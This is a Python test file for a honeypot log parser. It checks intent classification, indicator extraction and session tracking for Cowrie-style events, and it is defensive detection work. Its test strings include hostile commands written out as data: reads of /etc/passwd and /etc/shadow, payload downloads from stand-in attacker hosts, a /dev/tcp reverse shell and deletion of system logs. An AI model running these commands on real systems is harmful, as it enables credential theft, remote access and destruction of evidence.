import sys
import os
from pathlib import Path
import pytest

# Ensure honeypot parser is importable
repo_root = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(repo_root / "honeypot" / "parsers"))

os.environ["SENTINEL_KEY"] = "mock-sentinel-key-for-parser-tests"
import log_parser

def test_classify_intent_known_categories():
    assert log_parser.classify_intent("cat /etc/passwd") == "CREDENTIAL_HARVEST"
    assert log_parser.classify_intent("cat /etc/shadow") == "CREDENTIAL_HARVEST"
    assert log_parser.classify_intent("wget https://malware.evil/payload.sh") == "MALWARE_DOWNLOAD"
    assert log_parser.classify_intent("curl http://attacker.com/miner.elf") == "MALWARE_DOWNLOAD"
    assert log_parser.classify_intent("chmod +x /tmp/backdoor") == "PRIVILEGE_ESCALATION"
    assert log_parser.classify_intent("crontab -l") == "PERSISTENCE"
    assert log_parser.classify_intent("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1") == "REVERSE_SHELL"
    assert log_parser.classify_intent("uname -a; whoami") == "RECONNAISSANCE"
    assert log_parser.classify_intent("rm -rf /var/log") == "DESTRUCTION"
    assert log_parser.classify_intent("ls -la /home") == "UNKNOWN"

def test_extract_iocs_from_synthetic_log():
    sample_text = (
        "Attacker downloaded http://198.51.100.25/dropper.bin with hash "
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 "
        "and tried to inspect /etc/passwd"
    )
    iocs = log_parser.extract_iocs(sample_text)
    assert "198.51.100.25" in iocs["ips"]
    assert "http://198.51.100.25/dropper.bin" in iocs["urls"]
    assert "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" in iocs["hashes"]
    assert "/etc/passwd" in iocs["sensitiveFiles"]

def test_synthetic_event_lifecycle_does_not_crash():
    # Simulate cowrie connect event
    connect_event = {
        "eventid": "cowrie.session.connect",
        "session": "test-session-001",
        "src_ip": "192.0.2.45",
        "src_port": 54321,
        "timestamp": "2026-10-15T12:00:00Z"
    }
    log_parser.on_connect(connect_event)
    assert "test-session-001" in log_parser._sessions
    session_data = log_parser._sessions["test-session-001"]
    assert session_data["sourceIP"] == "192.0.2.45"
    assert session_data["sourcePort"] == 54321
